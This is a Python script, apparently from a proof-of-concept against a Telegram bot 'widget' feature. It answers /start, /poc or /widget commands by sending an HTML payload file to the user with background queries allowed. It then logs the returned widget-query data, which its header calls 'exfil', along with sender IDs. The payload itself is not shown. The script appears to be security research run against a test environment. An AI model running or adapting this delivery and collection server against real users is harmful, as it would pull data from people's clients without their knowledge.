#!/usr/bin/env python3
# answer /start with the current payload and log widget-query exfil
# Payload source: --payload (default: out/current.html).
# State: --state-dir (offset persistence).

import argparse, json, os, sys, time, urllib.request, urllib.error

ap = argparse.ArgumentParser()
ap.add_argument("--payload", default="out/current.html")
ap.add_argument("--state-dir", default="out/botstate")
ap.add_argument("--env-file", default="../poc-bot/.env")
ap.add_argument("--duration", type=float, default=3600)
ap.add_argument("--width", type=int, default=390)
a = ap.parse_args()

if a.env_file and os.path.isfile(a.env_file):
    for raw in open(a.env_file, encoding="utf-8").read().splitlines():
        line = raw.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        if line.startswith("export "):
            line = line[7:].lstrip()
        k, v = line.split("=", 1)
        os.environ.setdefault(k.strip(), v.strip().strip("'\""))

TOKEN = os.environ.get("BOT_TOKEN", "")
API_ROOT = os.environ.get("TELEGRAM_API_ROOT", "https://api.telegram.org/beta").rstrip("/")
TEST_ENV = os.environ.get("TELEGRAM_TEST_ENV", "1").strip().lower() not in {"0", "false", "no", "off"}
BASE = f"{API_ROOT}/bot{TOKEN}" + ("/test" if TEST_ENV else "")
if not TOKEN:
    sys.exit("need BOT_TOKEN")

os.makedirs(a.state_dir, exist_ok=True)
off_file = os.path.join(a.state_dir, "offset.json")
qlog = os.path.join(a.state_dir, "queries.log")
off = 0
if os.path.exists(off_file):
    try:
        off = json.load(open(off_file)).get("offset", 0)
    except Exception:
        off = 0

def log(*x):
    line = " ".join(str(i) for i in x)
    print(line, flush=True)
    with open(qlog, "a") as f:
        f.write(time.strftime("%H:%M:%S ") + line + "\n")

def api(method, **params):
    url = f"{BASE}/{method}"
    body = json.dumps(params).encode()
    req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return json.loads(r.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        return {"ok": False, "http": e.code, "body": e.read()[:200].decode("utf-8", "replace")}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def find_query(u):
    for k in ("widget_query", "shared_widget_query", "bot_widget_query", "widgetQuery"):
        v = u.get(k)
        if isinstance(v, dict) and "id" in v and "data" in v:
            return v
    for v in u.values():
        if isinstance(v, dict) and "id" in v and "data" in v and "from" in v:
            return v
    return None

def send_payload(chat_id):
    try:
        html = open(a.payload, encoding="utf-8").read()
    except OSError as e:
        return {"ok": False, "error": f"payload read: {e}"}
    if len(html.encode("utf-8")) > 32768:
        return {"ok": False, "error": "html over 32768"}
    return api("sendWidget", chat_id=chat_id, html=html, width=a.width,
               disable_notification=True, allow_queries=True, background_query=True)

log(f"SUPERVISOR start payload={a.payload}")
t0 = time.time()
while time.time() - t0 < a.duration:
    r = api("getUpdates", offset=off, timeout=25)
    if not r.get("ok"):
        log("getUpdates failed", {k: v for k, v in r.items() if k != "body"})
        time.sleep(3)
        continue
    for u in r.get("result", []):
        off = max(off, u.get("update_id", 0) + 1)
        q = find_query(u)
        if q:
            frm = q.get("from") or {}
            log("QUERY id=%s from=%s data=%r" % (q.get("id"), frm.get("id"), q.get("data")))
            ar = api("answerWidgetQuery", widget_query_id=q.get("id"), data="ok")
            log("ANSWERED ok=%s" % ar.get("ok"))
            continue
        m = u.get("message") or u.get("edited_message") or {}
        text = (m.get("text") or "").strip()
        chat = m.get("chat") or {}
        if chat.get("type") == "private" and text.split(None, 1)[0].split("@")[0].lower() in ("/start", "/poc", "/widget"):
            log("START from=%s chat=%s" % ((m.get("from") or {}).get("id"), chat.get("id")))
            res = send_payload(chat.get("id"))
            log("SEND ok=%s %s" % (res.get("ok"), res.get("result", {}).get("message_id") or res.get("description") or res.get("error")))
    try:
        json.dump({"offset": off}, open(off_file, "w"))
    except OSError:
        pass
log("SUPERVISOR done")
